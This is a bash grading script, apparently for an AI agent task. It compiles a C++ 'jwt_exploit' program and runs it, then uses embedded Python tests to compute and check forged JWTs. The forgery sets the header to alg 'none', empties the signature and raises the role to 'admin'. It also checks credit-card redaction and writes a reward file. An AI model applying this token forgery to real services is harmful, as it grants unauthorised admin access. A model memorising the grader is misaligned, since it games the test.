#!/bin/bash
mkdir -p /logs/verifier
ok=1

SOURCE=/home/user/jwt_exploit.cpp
BINARY=/tmp/jwt_exploit_verifier
OUTPUT=/home/user/pwned_tokens.json

if [ ! -f "$SOURCE" ]; then
    echo "Missing required C++ source: $SOURCE" >&2
    ok=0
elif ! g++ -std=c++17 "$SOURCE" -o "$BINARY"; then
    echo "Failed to compile $SOURCE" >&2
    ok=0
elif [ ! -x "$BINARY" ]; then
    echo "Compilation did not produce an executable" >&2
    ok=0
else
    rm -f "$OUTPUT"
    if ! timeout 20s "$BINARY"; then
        echo "Compiled program did not execute cleanly" >&2
        ok=0
    elif [ ! -f "$OUTPUT" ]; then
        echo "Compiled program did not create $OUTPUT" >&2
        ok=0
    fi
fi

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import json
import base64
import pytest

def b64url_encode(data: bytes) -> str:
    """Base64Url encode with no padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def b64url_decode(b64_str: str) -> bytes:
    """Base64Url decode with automatic padding."""
    pad_len = 4 - (len(b64_str) % 4)
    pad_len = 0 if pad_len == 4 else pad_len
    padded = b64_str + ('=' * pad_len)
    return base64.urlsafe_b64decode(padded)

@pytest.fixture
def expected_data():
    input_file = "/home/user/tokens.txt"
    assert os.path.isfile(input_file), f"Input file {input_file} is missing."

    with open(input_file, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]

    expected_results = []
    for line in lines:
        parts = line.split('.')
        assert len(parts) == 3, f"Invalid JWT format in input file: {line}"

        header_b64, payload_b64, _ = parts

        payload_bytes = b64url_decode(payload_b64)
        original_payload = json.loads(payload_bytes)
        username = original_payload.get("username", "")

        redacted_payload = dict(original_payload)
        if "credit_card" in redacted_payload:
            redacted_payload["credit_card"] = "REDACTED"

        forged_header = {"alg": "none"}
        forged_payload = dict(original_payload)
        if "role" in forged_payload:
            forged_payload["role"] = "admin"

        forged_header_b64 = b64url_encode(json.dumps(forged_header, separators=(',', ':')).encode('utf-8'))
        forged_payload_b64 = b64url_encode(json.dumps(forged_payload, separators=(',', ':')).encode('utf-8'))
        forged_token = f"{forged_header_b64}.{forged_payload_b64}."

        expected_results.append({
            "username": username,
            "forged_token": forged_token,
            "redacted_original_payload": redacted_payload
        })

    return expected_results

def test_output_file_exists():
    output_file = "/home/user/pwned_tokens.json"
    assert os.path.isfile(output_file), f"Output file {output_file} was not found."

def test_output_file_valid_json():
    output_file = "/home/user/pwned_tokens.json"
    if not os.path.isfile(output_file):
        pytest.skip("Output file missing")

    with open(output_file, 'r') as f:
        try:
            data = json.load(f)
        except json.JSONDecodeError as e:
            pytest.fail(f"Output file is not valid JSON: {e}")

    assert isinstance(data, list), "Output JSON must be an array of objects."

def test_output_data_correctness(expected_data):
    output_file = "/home/user/pwned_tokens.json"
    if not os.path.isfile(output_file):
        pytest.skip("Output file missing")

    with open(output_file, 'r') as f:
        try:
            actual_data = json.load(f)
        except json.JSONDecodeError:
            pytest.skip("Output file is not valid JSON")

    assert len(actual_data) == len(expected_data), f"Expected {len(expected_data)} items in output, found {len(actual_data)}."

    for i, (actual, expected) in enumerate(zip(actual_data, expected_data)):
        assert isinstance(actual, dict), f"Item {i} in output array is not a JSON object."

        assert "username" in actual, f"Item {i} is missing 'username' field."
        assert actual["username"] == expected["username"], f"Item {i} username mismatch. Expected '{expected['username']}', got '{actual['username']}'."

        assert "forged_token" in actual, f"Item {i} is missing 'forged_token' field."
        assert actual["forged_token"] == expected["forged_token"], f"Item {i} forged_token mismatch."

        assert "redacted_original_payload" in actual, f"Item {i} is missing 'redacted_original_payload' field."
        actual_redacted = actual["redacted_original_payload"]
        if isinstance(actual_redacted, str):
            try:
                actual_redacted_parsed = json.loads(actual_redacted)
            except json.JSONDecodeError:
                pytest.fail(f"Item {i} 'redacted_original_payload' is a string but not valid JSON.")
        else:
            actual_redacted_parsed = actual_redacted

        assert actual_redacted_parsed == expected["redacted_original_payload"], f"Item {i} redacted_original_payload mismatch. Expected {expected['redacted_original_payload']}, got {actual_redacted_parsed}."
TEST_EOF

if [ "$ok" -eq 1 ] && ! python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    ok=0
fi

cat << 'DYNAMIC_EOF' > /tmp/test_dynamic.py
import base64
import json
import os
import secrets
import subprocess

TOKENS = "/home/user/tokens.txt"
OUTPUT = "/home/user/pwned_tokens.json"
BINARY = "/tmp/jwt_exploit_verifier"

def enc(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

def dec(data):
    return base64.urlsafe_b64decode(data + "=" * (-len(data) % 4))

def compact(obj):
    return json.dumps(obj, separators=(",", ":"), ensure_ascii=False)

suffix = secrets.token_hex(8)
card_a = "-".join(str(secrets.randbelow(9000) + 1000) for _ in range(4))
card_b = "-".join(str(secrets.randbelow(9000) + 1000) for _ in range(4))
payloads = [
    {"username": "alice_" + suffix, "role": "user", "credit_card": card_a},
    {"username": "bob_" + suffix, "role": "guest", "credit_card": card_b},
    {"username": "charlie_" + suffix, "role": "user", "department": "sales_" + suffix},
]
header = {"alg": "HS256", "typ": "JWT"}
tokens = [f"{enc(compact(header))}.{enc(compact(p))}.{enc('random-signature-' + suffix)}" for p in payloads]

old_tokens = open(TOKENS, "rb").read() if os.path.exists(TOKENS) else None
old_output = open(OUTPUT, "rb").read() if os.path.exists(OUTPUT) else None
try:
    with open(TOKENS, "w", encoding="utf-8") as f:
        f.write("\n".join(tokens) + "\n")
    if os.path.exists(OUTPUT):
        os.remove(OUTPUT)

    result = subprocess.run([BINARY], timeout=20, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    assert result.returncode == 0, f"Program failed on runtime-generated tokens: {result.stderr.decode(errors='replace')}"
    assert os.path.isfile(OUTPUT), "Program did not create output for runtime-generated tokens"

    with open(OUTPUT, encoding="utf-8") as f:
        actual = json.load(f)
    assert isinstance(actual, list), "Output JSON must be an array"
    assert len(actual) == len(payloads), "Output must contain one item per runtime-generated token"

    for i, (item, original) in enumerate(zip(actual, payloads)):
        assert isinstance(item, dict), f"Dynamic item {i} is not an object"
        assert "username" in item, f"Dynamic item {i} is missing username"
        assert item["username"] == original["username"], f"Dynamic item {i} has the wrong username"

        assert "forged_token" in item, f"Dynamic item {i} is missing forged_token"
        parts = item["forged_token"].split(".")
        assert len(parts) == 3 and parts[2] == "", f"Dynamic item {i} forged token must end with an empty signature"
        assert dec(parts[0]) == b'{"alg":"none"}', f"Dynamic item {i} forged header is not exactly {{\"alg\":\"none\"}}"
        forged_payload = json.loads(dec(parts[1]).decode("utf-8"))
        expected_forged = dict(original)
        expected_forged["role"] = "admin"
        assert forged_payload == expected_forged, f"Dynamic item {i} forged payload is incorrect"

        assert "redacted_original_payload" in item, f"Dynamic item {i} is missing redacted_original_payload"
        redacted = item["redacted_original_payload"]
        if isinstance(redacted, str):
            redacted = json.loads(redacted)
        expected_redacted = dict(original)
        if "credit_card" in expected_redacted:
            expected_redacted["credit_card"] = "REDACTED"
        assert redacted == expected_redacted, f"Dynamic item {i} redacted payload is incorrect"
finally:
    if old_tokens is None:
        if os.path.exists(TOKENS):
            os.remove(TOKENS)
    else:
        with open(TOKENS, "wb") as f:
            f.write(old_tokens)
    if old_output is None:
        if os.path.exists(OUTPUT):
            os.remove(OUTPUT)
    else:
        with open(OUTPUT, "wb") as f:
            f.write(old_output)
DYNAMIC_EOF

if [ "$ok" -eq 1 ] && ! python3 /tmp/test_dynamic.py 2>&1; then
    ok=0
fi

if [ "$ok" -eq 1 ]; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
